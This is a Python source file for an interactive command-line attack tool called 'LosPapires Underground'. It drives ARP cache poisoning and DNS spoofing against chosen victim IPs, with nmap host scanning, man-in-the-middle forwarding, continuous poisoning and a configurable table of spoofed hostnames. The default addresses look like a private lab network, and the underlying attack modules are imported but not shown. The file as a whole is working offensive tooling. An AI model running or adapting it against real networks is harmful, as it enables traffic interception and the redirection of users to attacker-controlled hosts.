
import os
import threading
import time
from typing import Dict, List

import nmap
from arp_spoofing import ARPSpoof
from utils.interface import interface_config

from dns_spoofing import DNSSpoof

from rich.console import Console
from rich.panel import Panel
from rich.prompt import IntPrompt, Prompt, Confirm
from rich.table import Table
from rich.status import Status


console = Console()

# interface_config = InterfaceConfig("eth0", "08:00:27:95:bd:54",
# 									   "192.168.56.169", "192.168.56.0/24")

# have this loaded from a json file??
DNS_CONFIG = {
	"mal_dns_table": {"www.example.com": interface_config.IP_ADDR},
	"forwarding": False,
	"dns_server_ip": "192.168.56.103"
}

ARP_CONFIG = {
	"victim_ip": "192.168.56.101",
	"impersonate_ip": "192.168.56.103",
	"MITM": False,
	"restore": True,
	"duckforce": True
}

style = "magenta bold"


def main():

	duck = r"""
	                                                               
                                            ██████████                                  
                                      ░░  ██░░░░░░░░░░██                                
                                        ██░░░░░░░░░░░░░░██                              
                                        ██░░░░░░░░████░░██████████                      
                            ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██                      
                          ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██                      
                          ██░░░░██      ██░░░░░░░░░░░░░░████████                        
                        ██░░░░░░░░██      ██░░░░░░░░░░░░██                              
                        ██░░░░░░░░████████████░░░░░░░░██                                
                        ██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██                              
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                              
                          ██░░░░░░░░░░░░░░░░░░░░░░░░░░██                                
                            ██████░░░░░░░░░░░░░░░░████                                  
                                  ████████████████                                      
                                                                                        

		"""
    
	while True:
		print(duck)
		console.print(Panel("", title="🦆🦆 Welcome to LosPapires Underground 🦆🦆", 			subtitle="Please choose your type of attack"), style = "bold green italic")
		print("\n")
  
		log("1", f"ARP Cache Poisoning")
		log("2", "DNS Spoofing")
		log("3", "QUIT", style="red blink bold")
  
		choice = IntPrompt.ask("Pick", default=3)

		if choice == 1:
			start_arp_attack()
		elif choice == 2:
			start_dns_attack()
		elif choice == 3:
			clear()
			quit()
   
		clear()
	
def start_arp_attack():
    
	while True:
		clear()
		console.print(Panel("", title="🦆🦆 LosPapires ARP Spoofing 🦆🦆", 			subtitle="Please follow the configuration below"), style = "bold green italic")
		print("\n")
		
		log("1", f"Set your victims' IP addresses. Currently: {ARP_CONFIG['victim_ip']} and {ARP_CONFIG['impersonate_ip']}", style = style)
		# log("2", f"Set IP you want to impersonate. Currently: {ARP_CONFIG['impersonate_ip']} ", style = style)
		log("2", f"Would you like to enable packet forwarding? Currently: {ARP_CONFIG['MITM']}", style = style)
		log("3", f"Would you like to restore ARP tables when closing? Currently: {ARP_CONFIG['restore']}", style = style)
		log("4", f"Would you like to constantly poison the Victim's ARP Cache? Currently: {ARP_CONFIG['duckforce']}", style = style)
		log("5", f"Start attack", style = "green  bold blink")
		log("6", "EXIT", style ="red blink bold")
	
		choice = IntPrompt.ask("Pick", default=5)
		clear()
	
		if choice == 1:
		
			answer = Confirm.ask(f"Would you like to scan for available hosts? This might take a while")
	
			if answer:
				with console.status("[bold green]Scanning for hosts...", spinner="bouncingBall"):
					scanner = nmap.PortScanner()
					scanner.scan(interface_config.NETWORK_ADDRESS, arguments='-sn', sudo=True)

					hosts = "    ".join(scanner.all_hosts())
					print()
					console.print(Panel.fit("[white]"+hosts, title="Available hosts"), style="bold green italic")
		
			ARP_CONFIG["victim_ip"] = Prompt.ask("IP of victim", default="192.168.56.101")
			ARP_CONFIG["impersonate_ip"] = Prompt.ask("IP you want to impersonate", default="192.168.56.103")
   
		if choice == 2:
			ARP_CONFIG['MITM'] = not ARP_CONFIG['MITM']

		if choice == 3:
			ARP_CONFIG["restore"] = not ARP_CONFIG['restore']

		if choice == 4:
			ARP_CONFIG['duckforce'] = not ARP_CONFIG['duckforce']
   
		if choice == 5:
			arp_attack = ARPSpoof( 
				victim1_ip=ARP_CONFIG["victim_ip"],
				victim2_ip=ARP_CONFIG["impersonate_ip"],
    			mitm=ARP_CONFIG["MITM"], restore=ARP_CONFIG["restore"],
				duckforce=ARP_CONFIG["duckforce"])

			try:
				console.print(Panel(f"[blue italic]{ARP_CONFIG['victim_ip']} and {ARP_CONFIG['impersonate_ip']}", title="Running attack on"), style = style)
				with console.status("[bold red]Attack is running...press CTRL+C to stop"):
					arp_attack.start_attack()
     
			except KeyboardInterrupt:
				log("info", "Restoring ARP Cache...")
				arp_attack.restore_arp()
				time.sleep(2)

		if choice == 6:
			break
	 

def start_dns_attack():

	while True:
		clear()
		style = "magenta bold"
  
		console.print(Panel("", title="🦆🦆 Welcome to LosPapires DNS Spoofing 🦆🦆", subtitle="Please follow the configuration below"), style = "bold green italic")
		print("\n")

		log("1", f"Setup spoofed DNS table", style = style)
		console.print(create_table("Current Entries", ["Hostname", "IP Address"], DNS_CONFIG['mal_dns_table'], title_style = "cyan bold"))

		log("2", f"Set DNS Server IP. Currently: {DNS_CONFIG['dns_server_ip']}")
		log("3", f"Toggle forwarding? Currently: {DNS_CONFIG['forwarding']} Requests will be forwarded to 8.8.8.8", style = style)
		log("4", "Start attack (WILL PERFOMR ARP Spoofing FIRST)", style = style)
		log("5", "EXIT", style = "red blink bold")
  

		choice = IntPrompt.ask("Pick", default=4)
		
		clear()
		if choice == 1:
			while True:
				console.print(Panel("", title="🦆🦆 LosPapires DNS Spoofing 🦆🦆", subtitle="Configuring DNS Entries"), style = "cyan bold italic")
				
				print()
				console.print(create_table("Current Entries", ["Hostname", "IP Address"], DNS_CONFIG['mal_dns_table']))

				print("\n")
				log("1", "Add a new entry")
				log("2", "Quit")

				option = IntPrompt.ask("Pick ", default = 2)
				
				if option == 2:
					break

				address = Prompt.ask("Type the host name you want to spoof", default="www.example.com")
				ip = Prompt.ask(f"Type the ip address to redirect to", default=interface_config.IP_ADDR)

				clear()

				DNS_CONFIG['mal_dns_table'][address] = ip
				log("succes", f"Added entry: {address}: {ip}\n")

		elif choice == 2:
			DNS_CONFIG["dns_server_ip"] = Prompt.ask("Set IP of local DNS server", default = DNS_CONFIG["dns_server_ip"])
  
		elif choice == 3:
			DNS_CONFIG["forwarding"] = not DNS_CONFIG["forwarding"]

		elif choice == 4:
   
			dns_attack = DNSSpoof(net_interface = interface_config,
										forward=DNS_CONFIG["forwarding"],
										mal_dns_table=DNS_CONFIG["mal_dns_table"])
   
			answer = Confirm.ask(f"Would you like to scan for available hosts? This might take a while")
	
			if answer:
				with console.status("[bold green]Scanning for hosts...", spinner="bouncingBall"):
					scanner = nmap.PortScanner()
					scanner.scan(interface_config.NETWORK_ADDRESS, arguments='-sn', sudo=True)

					hosts = "    ".join(scanner.all_hosts())
					print()
					console.print(Panel.fit("[white]"+hosts, title="Available hosts"), style="bold green italic")
		
			victim_ip = Prompt.ask("Where do you want to intercept DNS requests from?", default="192.168.56.101")
   
			arp_thread = ARPSpoof( 
				victim1_ip=victim_ip,
				victim2_ip=DNS_CONFIG["dns_server_ip"],
    			)

			print()
			log("info", "Starting attack!", style="green bold")

			try:
				with console.status("[bold red]ARP attack is starting...[yellow bold]CTRL + C to stop", spinner="bouncingBall") as status:
					time.sleep(1)
					arp_thread.start()
					status.update(status="[bold red]DNS attack is running...[yellow bold]CTRL + C to stop")
					dns_attack.start_attack()
     
					print()
					log("info","RESTORING ARP CACHES\n", style="bold cyan underline")
					status.update(status="[bold yellow]Stopping attack...")
     
					arp_thread.join()
					arp_thread.restore_arp()
					time.sleep(2)
     
			except:
				arp_thread.join()
				# status.update(status="[bold green]Restoring ARP caches")
				console.print("RESTORING ARP CACHES")
				arp_thread.restore_arp()
				time.sleep(1.5)
					
				
			
     
		elif choice == 5:
			break

		clear()
		

def clear():
	os.system("clear")

def log(prefix: str, message: str, style = "magenta bold") -> None:
	# print(f"[{prefix.upper()}]: {message}\n")
	console.print(f"[{prefix.upper()}]: {message}\n", style= style)

def create_table(title: str, columns: List,  entries: Dict, title_style = "cyan blink bold") -> Table:
	table = Table(title=title, title_style=title_style)

	for i, j in enumerate(columns):
		table.add_column(j, style= "cyan" if i%2 else "green", no_wrap=True)
	
	for i in entries.items():
		table.add_row(*i)
  
	return table


if __name__ == "__main__":
	main()

